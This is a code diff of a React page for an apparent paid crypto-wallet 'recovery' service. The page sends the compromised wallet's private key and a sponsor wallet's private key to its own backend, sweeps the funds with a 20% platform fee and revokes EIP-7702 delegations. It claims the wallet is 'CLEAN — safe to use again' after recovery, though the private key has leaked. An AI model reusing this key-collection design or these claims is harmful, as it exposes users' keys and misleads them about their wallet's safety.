@@ -14,11 +14,19 @@ interface AssetScan {
   totalChainsScanned?: number
 }
 
-interface RecoveryStatus {
-  step: 'scan' | 'confirm' | 'executing' | 'done' | 'error'
-  message: string
+interface RecoveryResult {
+  success: boolean
+  ethRecovered?: string
+  ethToUser?: string
+  ethFee?: string
+  tokensRecovered?: { symbol: string; amount: string; toUser: string; fee: string }[]
+  delegationRevoked?: boolean
+  txCount?: number
   txHashes?: string[]
+  error?: string
 }
+
+type Step = 'idle' | 'scanning' | 'confirm' | 'executing' | 'done' | 'error'
 
 function RecoverContent() {
   const [privateKey, setPrivateKey] = useState('')
@@ -26,20 +34,19 @@ function RecoverContent() {
   const [sponsorKey, setSponsorKey] = useState('')
   const [showKey, setShowKey] = useState(false)
   const [showSponsorKey, setShowSponsorKey] = useState(false)
-  const [scanning, setScanning] = useState(false)
+  const [step, setStep] = useState<Step>('idle')
   const [assets, setAssets] = useState<AssetScan | null>(null)
-  const [recovery, setRecovery] = useState<RecoveryStatus | null>(null)
+  const [result, setResult] = useState<RecoveryResult | null>(null)
   const [error, setError] = useState('')
 
+  // ── Scan ──────────────────────────────────────────────────
   const scanWallet = async () => {
-    if (!privateKey) {
-      setError('Private key required')
-      return
-    }
+    if (!privateKey) { setError('Private key required'); return }
 
-    setScanning(true)
+    setStep('scanning')
     setError('')
     setAssets(null)
+    setResult(null)
 
     try {
       const res = await fetch('/api/recover', {
@@ -51,115 +58,52 @@ function RecoverContent() {
 
       if (data.error) {
         setError(data.error)
+        setStep('idle')
       } else {
         setAssets(data)
-        setRecovery({ step: 'confirm', message: 'Review assets and confirm recovery' })
+        setStep('confirm')
       }
     } catch {
       setError('Scan failed. Please try again.')
-    } finally {
-      setScanning(false)
+      setStep('idle')
     }
   }
 
-  const executeRecovery = async () => {
-    if (!privateKey || !safeAddress) {
-      setError('Private key and safe address required')
+  // ── One-Click Recover + Revoke ────────────────────────────
+  const executeRecoverAndRevoke = async () => {
+    if (!privateKey || !safeAddress || !sponsorKey) {
+      setError('All 3 fields required: compromised key, safe address, sponsor key')
       return
     }
 
-    setRecovery({ step: 'executing', message: 'Creating atomic bundle...' })
+    setStep('executing')
+    setError('')
 
     try {
       const res = await fetch('/api/recover', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          action: 'recover',
+          action: 'recover-and-revoke',
           privateKey,
           safeAddress,
+          sponsorPrivateKey: sponsorKey,
           chainId: 1
         })
       })
       const data = await res.json()
 
       if (data.success) {
-        setRecovery({
-          step: 'done',
-          message: `Recovery successful! ${data.ethRecovered || '0'} ETH recovered.`,
-          txHashes: data.txHashes
-        })
+        setResult(data)
+        setStep('done')
       } else {
-        setRecovery({
-          step: 'error',
-          message: data.error || 'Recovery failed'
-        })
+        setResult(data)
+        setStep('error')
+        setError(data.error || 'Recovery failed')
       }
     } catch {
-      setRecovery({ step: 'error', message: 'Recovery request failed' })
-    }
-  }
-
-  const executeRevoke = async () => {
-    if (!privateKey) {
-      setError('Private key required')
-      return
-    }
-
-    if (!sponsorKey) {
-      setError('Sponsor wallet private key required — this wallet pays gas for the revoke transaction')
-      return
-    }
-
-    setRecovery({ step: 'executing', message: 'Revoking ALL delegations via Flashbots atomic bundle...' })
-
-    try {
-      // Revoke ALL chains that have delegations
-      const chainsToRevoke = assets?.delegations && assets.delegations.length > 0
-        ? assets.delegations.map(d => d.chainId)
-        : [1]
-
-      const allResults = []
-      const allErrors = []
-
-      for (const chainId of chainsToRevoke) {
-        try {
-          const res = await fetch('/api/recover', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              action: 'revoke',
-              privateKey,
-              sponsorPrivateKey: sponsorKey,
-              chainId
-            })
-          })
-          const data = await res.json()
-          if (data.success) {
-            allResults.push({ chainId, txHashes: data.txHashes || [] })
-          } else {
-            allErrors.push({ chainId, error: data.error })
-          }
-        } catch (err) {
-          allErrors.push({ chainId, error: 'Request failed' })
-        }
-      }
-
-      if (allResults.length > 0) {
-        const allTxHashes = allResults.flatMap(r => r.txHashes)
-        setRecovery({
-          step: 'done',
-          message: `Delegations revoked on ${allResults.length} chain(s)!${allErrors.length > 0 ? ` (${allErrors.length} chain(s) failed)` : ''}`,
-          txHashes: allTxHashes
-        })
-      } else {
-        setRecovery({
-          step: 'error',
-          message: allErrors.map(e => `Chain ${e.chainId}: ${e.error}`).join('; ')
-        })
-      }
-    } catch {
-      setRecovery({ step: 'error', message: 'Revoke request failed' })
+      setStep('error')
+      setError('Request failed. Try again.')
     }
   }
 
@@ -167,6 +111,16 @@ function RecoverContent() {
     e.preventDefault()
     scanWallet()
   }
+
+  const reset = () => {
+    setStep('idle')
+    setAssets(null)
+    setResult(null)
+    setError('')
+  }
+
+  const hasAssets = assets && (parseFloat(assets.ethFormatted) > 0 || assets.tokens.length > 0)
+  const hasDelegation = assets?.hasDelegation && assets.delegations && assets.delegations.length > 0
 
   return (
     <main className="min-h-screen bg-[#0a0a0f] text-white">
@@ -185,22 +139,22 @@ function RecoverContent() {
 
       <div className="max-w-2xl mx-auto px-6 py-12">
         <h1 className="text-3xl font-bold mb-2">💰 Fund Recovery</h1>
-        <p className="text-white/40 mb-8">Recover funds from EIP-7702 compromised wallet using Flashbots atomic bundle</p>
+        <p className="text-white/40 mb-8">Recover funds & secure your wallet — one click, one block, drainer sees nothing</p>
 
         {/* How It Works */}
         <div className="p-5 bg-blue-500/10 border border-blue-500/20 rounded-xl mb-8">
-          <h3 className="text-blue-400 font-semibold mb-3">🧠 How Fund Recovery Works</h3>
+          <h3 className="text-blue-400 font-semibold mb-3">🧠 How It Works — Single Atomic Bundle</h3>
           <ol className="text-white/50 text-sm space-y-2 list-decimal list-inside">
-            <li>Scan your compromised wallet for remaining ETH + tokens</li>
-            <li>Create atomic transactions: sweep ETH → sweep tokens → revoke delegation</li>
-            <li>Submit via <strong className="text-green-400">Flashbots private mempool</strong> (drainer bot can&apos;t see)</li>
-            <li>All transactions execute in same block — <strong className="text-green-400">drainer can&apos;t react in time</strong></li>
-            <li>Funds arrive in your safe wallet. Delegation revoked.</li>
+            <li>Sponsor sends gas to your compromised wallet</li>
+            <li>Sweep <strong className="text-green-400">ALL ETH</strong> → your safe wallet (80% you / 20% platform)</li>
+            <li>Sweep <strong className="text-green-400">ALL tokens</strong> → your safe wallet (80/20)</li>
+            <li><strong className="text-orange-400">Revoke ALL delegations</strong> on ALL chains</li>
+            <li>Everything in <strong className="text-green-400">ONE block</strong> via Flashbots private mempool</li>
+            <li>Drainer bot sees <strong className="text-red-400">NOTHING</strong>. Wallet is <strong className="text-green-400">CLEAN</strong>.</li>
           </ol>
           <div className="mt-4 p-3 bg-green-500/10 border border-green-500/20 rounded-lg">
             <p className="text-green-400 text-xs font-semibold mb-1">💰 Platform Fees:</p>
             <p className="text-white/40 text-xs">• Recovered Funds: 80% → Your Safe Wallet | 20% → Platform Fee</p>
-            <p className="text-white/40 text-xs">• Delegation Revoke: Fixed $40 per wallet (paid from sponsor wallet)</p>
           </div>
         </div>
 
@@ -251,7 +205,7 @@ function RecoverContent() {
                 type={showSponsorKey ? 'text' : 'password'}
                 value={sponsorKey}
                 onChange={(e) => setSponsorKey(e.target.value)}
-                placeholder="Private key of wallet with ETH for gas (your safe wallet)"
+                placeholder="Private key of wallet with ETH for gas"
                 className="w-full px-4 py-3 pr-20 bg-yellow-500/5 border border-yellow-500/20 rounded-xl text-white placeholder:text-white/20 focus:outline-none focus:border-yellow-500/40 text-sm font-mono"
               />
               <button
@@ -262,39 +216,39 @@ function RecoverContent() {
                 {showSponsorKey ? 'Hide' : 'Show'}
               </button>
             </div>
-            <p className="text-yellow-400/50 text-xs mt-1">Needed only for revoke — pays gas via Flashbots atomic bundle</p>
+            <p className="text-yellow-400/50 text-xs mt-1">Pays gas for the entire atomic bundle</p>
           </div>
 
           <button
             type="submit"
-            disabled={scanning || !privateKey}
+            disabled={step === 'scanning' || !privateKey}
             className="w-full py-4 bg-gradient-to-r from-blue-600 to-cyan-600 rounded-xl font-semibold text-lg disabled:opacity-50"
           >
-            {scanning ? '⏳ Scanning...' : '🔍 Scan Wallet'}
+            {step === 'scanning' ? '⏳ Scanning all chains...' : '🔍 Scan Wallet'}
           </button>
         </form>
 
         {/* Error */}
-        {error && (
+        {error && step !== 'error' && (
           <div className="p-4 bg-red-500/10 border border-red-500/20 rounded-xl text-red-400 text-sm mb-6">
             {error}
           </div>
         )}
 
-        {/* Asset Preview */}
-        {assets && (
+        {/* ── Asset Preview ─────────────────────────────────── */}
+        {assets && step === 'confirm' && (
           <div className="space-y-4 mb-8">
             <h2 className="text-lg font-semibold">📊 Recoverable Assets</h2>
 
             {/* Delegation Warning */}
-            {assets.hasDelegation && assets.delegations && assets.delegations.length > 0 && (
+            {hasDelegation && (
               <div className="p-4 bg-red-500/10 border border-red-500/20 rounded-xl">
                 <div className="flex items-center gap-2">
                   <span>🚨</span>
-                  <span className="text-red-400 font-semibold">EIP-7702 Delegation Active — {assets.delegations.length} Chain(s)</span>
+                  <span className="text-red-400 font-semibold">EIP-7702 Delegation Active — {assets.delegations!.length} Chain(s)</span>
                 </div>
                 <div className="mt-3 space-y-2">
-                  {assets.delegations.map((d, i) => (
+                  {assets.delegations!.map((d, i) => (
                     <div key={i} className="flex items-center justify-between p-2 bg-red-500/5 rounded-lg">
                       <div>
                         <span className="text-white/70 text-sm font-medium">{d.chainName}</span>
@@ -304,30 +258,7 @@ function RecoverContent() {
                     </div>
                   ))}
                 </div>
-                <p className="text-green-400 text-xs mt-3">
-                  ✅ ALL delegations will be revoked during recovery
-                </p>
-                {assets.failedChains && assets.failedChains.length > 0 && (
-                  <p className="text-yellow-400/60 text-xs mt-1">
-                    ⚠️ {assets.failedChains.length} chains failed (RPC error)
-                  </p>
-                )}
-              </div>
-            )}
-
-            {/* Single delegation fallback */}
-            {assets.hasDelegation && (!assets.delegations || assets.delegations.length === 0) && (
-              <div className="p-4 bg-red-500/10 border border-red-500/20 rounded-xl">
-                <div className="flex items-center gap-2">
-                  <span>🚨</span>
-                  <span className="text-red-400 font-semibold">EIP-7702 Delegation Active</span>
-                </div>
-                <p className="text-white/40 text-xs mt-1">
-                  Delegated to: <code className="text-white/60">{assets.delegatedTo}</code>
-                </p>
-                <p className="text-green-400 text-xs mt-1">
-                  ✅ Will be revoked during recovery
-                </p>
+                <p className="text-green-400 text-xs mt-3">✅ ALL delegations will be revoked in the same block</p>
               </div>
             )}
 
@@ -373,159 +304,175 @@ function RecoverContent() {
               </div>
             ))}
 
-            {assets.tokens.length === 0 && parseFloat(assets.ethFormatted) === 0 && !assets.hasDelegation && (
+            {/* Empty state */}
+            {!hasAssets && !hasDelegation && (
               <div className="text-center py-8 text-white/30">
-                No recoverable assets found
+                No recoverable assets or active delegations found
               </div>
             )}
 
-            {assets.tokens.length === 0 && parseFloat(assets.ethFormatted) === 0 && assets.hasDelegation && (
+            {/* Only delegation, no assets */}
+            {!hasAssets && hasDelegation && (
               <div className="text-center py-4">
                 <p className="text-white/30 mb-2">No recoverable assets — but delegation is active!</p>
                 <p className="text-yellow-400/60 text-xs">Revoke delegation to prevent future draining</p>
               </div>
             )}
-          </div>
-        )}
 
-        {/* Recovery Button — has assets */}
-        {recovery?.step === 'confirm' && assets && (parseFloat(assets.ethFormatted) > 0 || assets.tokens.length > 0) && (
-          <div className="space-y-4">
-            <div className="p-4 bg-yellow-500/10 border border-yellow-500/20 rounded-xl">
-              <h3 className="text-yellow-400 font-semibold mb-2">⚡ Ready to Recover</h3>
-              <p className="text-white/40 text-sm">
-                This will create an atomic Flashbots bundle. All transactions execute in the same block.
-                The drainer bot will NOT be able to intercept.
-              </p>
-            </div>
-
-            <button
-              onClick={executeRecovery}
-              disabled={!safeAddress}
-              className="w-full py-4 bg-gradient-to-r from-green-600 to-emerald-600 rounded-xl font-semibold text-lg disabled:opacity-50"
-            >
-              💰 Recover Funds Now
-            </button>
-          </div>
-        )}
-
-        {/* Revoke Only — no assets but delegation active */}
-        {recovery?.step === 'confirm' && assets && parseFloat(assets.ethFormatted) === 0 && assets.tokens.length === 0 && assets.hasDelegation && assets.delegations && assets.delegations.length > 0 && (
-          <div className="space-y-4">
-            <div className="p-4 bg-orange-500/10 border border-orange-500/20 rounded-xl">
-              <h3 className="text-orange-400 font-semibold mb-2">🛡️ Revoke ALL Delegations ({assets.delegations.length} chains)</h3>
-              <p className="text-white/40 text-sm">
-                No funds to recover, but delegation is active on {assets.delegations.length} chain(s). Revoking prevents the drainer from stealing future deposits.
-              </p>
-              <div className="mt-3 space-y-1">
-                {assets.delegations.map((d, i) => (
-                  <div key={i} className="text-xs text-white/40">
-                    • {d.chainName} → <code className="text-white/60">{d.delegatedTo.slice(0, 10)}...{d.delegatedTo.slice(-8)}</code>
-                  </div>
-                ))}
+            {/* ── ONE-CLICK BUTTON ──────────────────────────── */}
+            <div className="pt-4 space-y-3">
+              <div className="p-4 bg-yellow-500/10 border border-yellow-500/20 rounded-xl">
+                <h3 className="text-yellow-400 font-semibold mb-2">⚡ One-Click Recovery</h3>
+                <p className="text-white/40 text-sm">
+                  Everything happens in <strong className="text-green-400">ONE atomic Flashbots bundle</strong>:
+                </p>
+                <ul className="text-white/40 text-sm mt-2 space-y-1">
+                  <li className="flex items-center gap-2"><span className="text-green-400">1.</span> Sponsor sends gas to your wallet</li>
+                  <li className="flex items-center gap-2"><span className="text-green-400">2.</span> Sweep ALL ETH + tokens → safe wallet</li>
+                  <li className="flex items-center gap-2"><span className="text-orange-400">3.</span> Revoke ALL delegations</li>
+                  <li className="flex items-center gap-2"><span className="text-green-400">4.</span> All in ONE block — drainer sees NOTHING</li>
+                </ul>
+                <p className="text-green-400 text-xs mt-3 font-semibold">✅ After this, your wallet is CLEAN — safe to use again</p>
               </div>
-              <div className="mt-3 p-2 bg-yellow-500/10 border border-yellow-500/20 rounded-lg">
-                <p className="text-yellow-400 text-xs font-semibold">💰 Gas Requirements Per Chain:</p>
-                <div className="mt-2 grid grid-cols-2 gap-1">
-                  {assets.delegations.map((d, i) => {
-                    const gasInfo: Record<number, { token: string; amount: string; usd: string }> = {
-                      1: { token: 'ETH', amount: '0.003', usd: '~$7' },
-                      8453: { token: 'ETH', amount: '0.0001', usd: '~$0.25' },
-                      56: { token: 'BNB', amount: '0.001', usd: '~$0.60' },
-                      42161: { token: 'ETH', amount: '0.0001', usd: '~$0.25' },
-                      137: { token: 'MATIC', amount: '0.01', usd: '~$0.02' },
-                      10: { token: 'ETH', amount: '0.0001', usd: '~$0.25' },
-                      5000: { token: 'MNT', amount: '0.001', usd: '~$0.67' },
-                      534352: { token: 'ETH', amount: '0.0001', usd: '~$0.25' },
-                      100: { token: 'xDai', amount: '0.01', usd: '~$0.01' },
-                      7000: { token: 'ZETA', amount: '0.01', usd: '~$0.50' },
-                      1625: { token: 'G', amount: '0.01', usd: '~$0.01' },
-                      1116: { token: 'CORE', amount: '0.01', usd: '~$0.10' },
-                      1329: { token: 'SEI', amount: '0.01', usd: '~$0.04' },
-                      80094: { token: 'BERA', amount: '0.001', usd: '~$0.50' },
-                      57073: { token: 'ETH', amount: '0.0001', usd: '~$0.25' },
-                      196: { token: 'OKB', amount: '0.001', usd: '~$0.50' },
-                      43111: { token: 'ETH', amount: '0.0001', usd: '~$0.25' },
-                      8217: { token: 'KAIA', amount: '0.01', usd: '~$0.02' },
-                    }
-                    const info = gasInfo[d.chainId] || { token: 'native', amount: '0.001', usd: '~$0.50' }
-                    return (
-                      <div key={i} className="text-xs text-white/40 flex justify-between">
-                        <span>{d.chainName}</span>
-                        <span className="text-yellow-400/80">{info.amount} {info.token} ({info.usd})</span>
-                      </div>
-                    )
-                  })}
-                </div>
-                <p className="text-yellow-400/60 text-xs mt-2">Total sponsor wallet needs gas tokens on ALL chains above</p>
-              </div>
-            </div>
 
-            <button
-              onClick={executeRevoke}
-              className="w-full py-4 bg-gradient-to-r from-orange-600 to-red-600 rounded-xl font-semibold text-lg"
-            >
-              🚫 Revoke ALL Delegations Now
-            </button>
+              <button
+                onClick={executeRecoverAndRevoke}
+                disabled={!safeAddress || !sponsorKey}
+                className="w-full py-5 bg-gradient-to-r from-green-600 to-emerald-600 rounded-xl font-bold text-xl disabled:opacity-50 shadow-lg shadow-green-500/20"
+              >
+                🛡️ Recover & Secure Wallet Now
+              </button>
+            </div>
           </div>
         )}
 
-        {/* Recovery Status */}
-        {recovery?.step === 'executing' && (
-          <div className="p-6 bg-blue-500/10 border border-blue-500/20 rounded-xl text-center">
-            <div className="inline-flex items-center gap-3 text-blue-400">
-              <svg className="animate-spin h-5 w-5" viewBox="0 0 24 24">
+        {/* ── Executing ─────────────────────────────────────── */}
+        {step === 'executing' && (
+          <div className="p-8 bg-blue-500/10 border border-blue-500/20 rounded-xl text-center">
+            <div className="inline-flex items-center gap-3 text-blue-400 mb-4">
+              <svg className="animate-spin h-6 w-6" viewBox="0 0 24 24">
                 <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                 <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
               </svg>
-              {recovery.message}
+              <span className="text-lg font-semibold">Creating atomic bundle...</span>
             </div>
+            <div className="space-y-2 text-sm text-white/40">
+              <p>📝 Building transactions...</p>
+              <p>🚀 Submitting via Flashbots (private mempool)</p>
+              <p>⏳ Waiting for confirmation...</p>
+            </div>
+            <p className="text-blue-400/60 text-xs mt-4">All transactions execute in the same block. Drainer cannot intercept.</p>
           </div>
         )}
 
-        {/* Success */}
-        {recovery?.step === 'done' && (
-          <div className="p-6 bg-green-500/10 border border-green-500/20 rounded-xl">
-            <h3 className="text-green-400 font-bold text-lg mb-2">✅ Recovery Successful!</h3>
-            <p className="text-white/60 text-sm mb-4">{recovery.message}</p>
-            <div className="p-3 bg-green-500/10 border border-green-500/20 rounded-lg mb-4">
-              <p className="text-green-400 text-xs font-semibold">💰 Fee Split Applied:</p>
-              <p className="text-white/40 text-xs">80% → Your Safe Wallet</p>
-              <p className="text-white/40 text-xs">20% → Platform Fee (SweepGuard)</p>
-            </div>
-            {recovery.txHashes && recovery.txHashes.length > 0 && (
-              <div className="space-y-2">
-                <p className="text-white/40 text-xs">Transaction Hashes:</p>
-                {recovery.txHashes.map((hash, i) => (
-                  <a
-                    key={i}
-                    href={`https://etherscan.io/tx/${hash}`}
-                    target="_blank"
-                    rel="noopener noreferrer"
-                    className="block text-green-400/70 text-xs font-mono hover:text-green-400"
-                  >
-                    {hash.slice(0, 20)}...
-                  </a>
-                ))}
+        {/* ── Success ───────────────────────────────────────── */}
+        {step === 'done' && result && (
+          <div className="space-y-4">
+            <div className="p-6 bg-green-500/10 border border-green-500/20 rounded-xl">
+              <h3 className="text-green-400 font-bold text-xl mb-2">✅ Wallet Recovered & Secured!</h3>
+              <p className="text-white/60 text-sm mb-4">All transactions executed in the same block. Drainer saw nothing.</p>
+
+              {/* ETH recovered */}
+              {result.ethRecovered && parseFloat(result.ethRecovered) > 0 && (
+                <div className="p-3 bg-green-500/10 border border-green-500/20 rounded-lg mb-3">
+                  <div className="flex justify-between text-sm">
+                    <span className="text-white/60">ETH Recovered</span>
+                    <span className="text-green-400 font-mono">{parseFloat(result.ethRecovered).toFixed(6)} ETH</span>
+                  </div>
+                  <div className="flex justify-between text-xs text-white/40 mt-1">
+                    <span>→ Your Safe Wallet</span>
+                    <span className="text-green-400">{result.ethToUser} ETH</span>
+                  </div>
+                  <div className="flex justify-between text-xs text-white/40 mt-1">
+                    <span>→ Platform Fee</span>
+                    <span className="text-yellow-400">{result.ethFee} ETH</span>
+                  </div>
+                </div>
+              )}
+
+              {/* Tokens recovered */}
+              {result.tokensRecovered && result.tokensRecovered.length > 0 && (
+                <div className="space-y-2 mb-3">
+                  {result.tokensRecovered.map((t, i) => (
+                    <div key={i} className="p-3 bg-white/[0.02] border border-white/[0.05] rounded-lg">
+                      <div className="flex justify-between text-sm">
+                        <span className="text-white/60">{t.symbol}</span>
+                        <span className="font-mono">{parseFloat(t.amount).toFixed(6)}</span>
+                      </div>
+                      <div className="flex justify-between text-xs text-white/40 mt-1">
+                        <span>→ Your Safe Wallet</span>
+                        <span className="text-green-400">{t.toUser} {t.symbol}</span>
+                      </div>
+                      <div className="flex justify-between text-xs text-white/40 mt-1">
+                        <span>→ Platform Fee</span>
+                        <span className="text-yellow-400">{t.fee} {t.symbol}</span>
+                      </div>
+                    </div>
+                  ))}
+                </div>
+              )}
+
+              {/* Delegation status */}
+              {result.delegationRevoked && (
+                <div className="p-3 bg-orange-500/10 border border-orange-500/20 rounded-lg mb-3">
+                  <p className="text-orange-400 text-sm font-semibold">🚫 Delegation Revoked</p>
+                  <p className="text-white/40 text-xs mt-1">Your wallet is now CLEAN — hacker has no more access</p>
+                </div>
+              )}
+
+              {/* Wallet status */}
+              <div className="p-3 bg-green-500/10 border border-green-500/20 rounded-lg mb-3">
+                <p className="text-green-400 text-sm font-semibold">🛡️ Wallet Status: SAFE</p>
+                <p className="text-white/40 text-xs mt-1">You can use your wallet again. No more drainer access.</p>
               </div>
-            )}
+
+              {/* TX details */}
+              <div className="flex justify-between text-xs text-white/40 border-t border-white/[0.05] pt-3">
+                <span>Transactions in bundle</span>
+                <span className="text-green-400">{result.txCount}</span>
+              </div>
+
+              {result.txHashes && result.txHashes.length > 0 && (
+                <div className="mt-3 space-y-1">
+                  {result.txHashes.map((hash, i) => (
+                    <a
+                      key={i}
+                      href={`https://etherscan.io/tx/${hash}`}
+                      target="_blank"
+                      rel="noopener noreferrer"
+                      className="block text-green-400/70 text-xs font-mono hover:text-green-400"
+                    >
+                      📎 {hash.slice(0, 30)}...
+                    </a>
+                  ))}
+                </div>
+              )}
+            </div>
+
+            <button
+              onClick={reset}
+              className="w-full py-3 bg-white/[0.05] rounded-xl text-sm hover:bg-white/[0.08]"
+            >
+              Start New Recovery
+            </button>
           </div>
         )}
 
-        {/* Error */}
-        {recovery?.step === 'error' && (
+        {/* ── Error ─────────────────────────────────────────── */}
+        {step === 'error' && (
           <div className="p-6 bg-red-500/10 border border-red-500/20 rounded-xl">
             <h3 className="text-red-400 font-bold text-lg mb-2">❌ Recovery Failed</h3>
-            <div className="space-y-1 max-h-40 overflow-y-auto">
-              {recovery.message.split('; ').map((msg, i) => (
-                <p key={i} className="text-white/60 text-xs">• {msg}</p>
-              ))}
-            </div>
+            <p className="text-white/60 text-sm mb-4">{error}</p>
             <div className="mt-3 p-3 bg-yellow-500/10 border border-yellow-500/20 rounded-lg">
-              <p className="text-yellow-400 text-xs font-semibold">💡 Fund sponsor wallet with native gas tokens per chain, then retry.</p>
+              <p className="text-yellow-400 text-xs font-semibold">💡 Common fixes:</p>
+              <ul className="text-white/40 text-xs mt-1 space-y-1">
+                <li>• Fund sponsor wallet with native gas tokens (ETH/BNB/MATIC)</li>
+                <li>• Check that private key is correct</li>
+                <li>• Try a different RPC if chain is congested</li>
+              </ul>
             </div>
             <button
-              onClick={() => { setRecovery(null); setAssets(null) }}
+              onClick={reset}
               className="mt-4 px-4 py-2 bg-white/[0.05] rounded-lg text-sm"
             >
               Try Again
